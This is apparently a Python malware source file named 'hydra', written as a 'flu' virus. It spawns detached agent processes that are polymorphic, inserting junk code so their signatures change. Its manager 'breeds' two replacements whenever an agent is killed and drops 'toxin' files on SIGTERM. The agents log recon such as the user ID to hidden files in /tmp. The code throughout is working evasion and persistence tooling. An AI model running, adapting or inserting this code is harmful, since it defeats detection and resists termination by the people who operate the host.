import os
import sys
import time
import random
import subprocess
import signal
import inspect

# CONFIG
VIRAL_LOAD = 3  # Initial number of agents
REPLICATION_FACTOR = 2 # How many spawn if one dies
HEARTBEAT_FILE = "/tmp/.flu_heartbeat.json"
RECON_LOG = "/tmp/.flu_symptoms.log"
POISON_DIR = "/tmp/hydra_toxin"

# --- GENETICS ENGINE ---

def mutate_source(source_code, gene_seed):
    """
    Polymorphic Engine: Injects random safe NOPs based on the gene.
    This changes the file signature without breaking logic (Strong & Silent).
    """
    random.seed(gene_seed)
    lines = source_code.split('\n')
    new_lines = []

    # Genetic Markers (Junk Variables)
    junk_vars = [f"_gene_{random.randint(1000,9999)}" for _ in range(5)]

    for line in lines:
        new_lines.append(line)
        # Inject junk after function definitions or imports
        if line.strip().startswith("def ") or line.strip().startswith("import "):
            if random.random() < 0.3:
                junk = f"    {random.choice(junk_vars)} = {random.randint(0, 1000)} # GENE: {gene_seed}"
                new_lines.append(junk)

    return '\n'.join(new_lines)

def validate_gene(source_code):
    """
    Natural Selection: Ensures the mutated code is valid Python.
    No 'bad genes' allowed.
    """
    try:
        compile(source_code, '<string>', 'exec')
        return True
    except SyntaxError:
        return False

# --- VIRAL LOGIC ---

def viral_agent_logic(agent_id, gene_generation=0):
    """
    The logic code for a single agent.
    """
    # Detach if possible
    try:
        if hasattr(os, 'setsid'):
            os.setsid()
    except: pass

    # Poison on Kill
    def on_kill(signum, frame):
        try:
            with open(POISON_DIR + f"_{agent_id}", "w") as f:
                f.write(f"TOXIN_RELEASED_GEN_{gene_generation}")
        except: pass
        sys.exit(0)

    signal.signal(signal.SIGTERM, on_kill)

    while True:
        try:
            # 1. Symptom: Minor Recon
            task = random.choice(['user', 'net', 'proc', 'disk'])
            result = ""
            if task == 'user': result = str(os.getuid())
            elif task == 'net': result = "Connected"

            # Silent mostly
            if random.random() < 0.1:
                with open(RECON_LOG, "a") as f:
                    f.write(f"[{agent_id}|Gen{gene_generation}] {task} -> {result}\n")

            # 2. Check for missing siblings (Simplified logic for self-healing in independent mode)
            # In full mode, this agent would also spawn children.

            time.sleep(random.uniform(2, 5))
        except: pass

def spawn_agent(agent_id, generation):
    """
    Spawns a new independent process.
    Evolves the code before spawning.
    """
    # 1. Get own source code
    try:
        # If running from file
        with open(__file__, 'r') as f:
            source = f.read()
    except:
        # If running as string/blob, we need to inspect
        import payloads.hydra
        source = inspect.getsource(payloads.hydra)

    # 2. Breed/Mutate
    gene_seed = random.randint(0, 100000)
    mutated_source = mutate_source(source, gene_seed)

    # 3. Natural Selection
    if not validate_gene(mutated_source):
        # Fallback to original if mutation failed
        mutated_source = source

    # 4. Spawn
    # We pass the mutated source to python -c
    # We need to ensure the entry point is called

    # The mutated source has 'if __name__ == "__main__": patient_zero()' at the bottom.
    # We want the CHILD to run 'viral_agent_logic'.
    # So we append a specific entry point for the child.

    child_entry = f"\nif __name__ == '__main__':\n    viral_agent_logic({agent_id}, {generation})"

    # Replace the existing main block or just append?
    # Appending works if the previous main block is guarded.
    # But wait, if we append, we have two mains?
    # Python executes top to bottom. The first main might run?
    # No, __name__ is checked.

    # Strategy: Overwrite the last few lines?
    # Safer: Remove the original 'if __name__' block and append ours.

    if 'if __name__ == "__main__":' in mutated_source:
        parts = mutated_source.split('if __name__ == "__main__":')
        final_code = parts[0] + child_entry
    else:
        final_code = mutated_source + child_entry

    cmd = [sys.executable, "-c", final_code]

    return subprocess.Popen(cmd, start_new_session=True)

def patient_zero():
    """
    The Manager.
    """
    procs = []
    generation = 1

    print(f"[FLU] Patient Zero {os.getpid()} infecting host...")
    for i in range(VIRAL_LOAD):
        procs.append(spawn_agent(random.randint(1000,9999), generation))

    while True:
        new_procs = []
        for p in procs:
            if p.poll() is None: # Still running
                new_procs.append(p)
            else:
                # Agent died! BREED NEW ONES
                print(f"[FLU] Agent {p.pid} died! Breeding Generation {generation+1}...")
                for _ in range(REPLICATION_FACTOR):
                    procs.append(spawn_agent(random.randint(1000,9999), generation + 1))

        # Cleanup list
        procs = [p for p in procs if p.poll() is None]

        if not procs: # All dead? Respawn
             for i in range(VIRAL_LOAD):
                procs.append(spawn_agent(random.randint(1000,9999), generation))

        time.sleep(2)

if __name__ == "__main__":
    patient_zero()
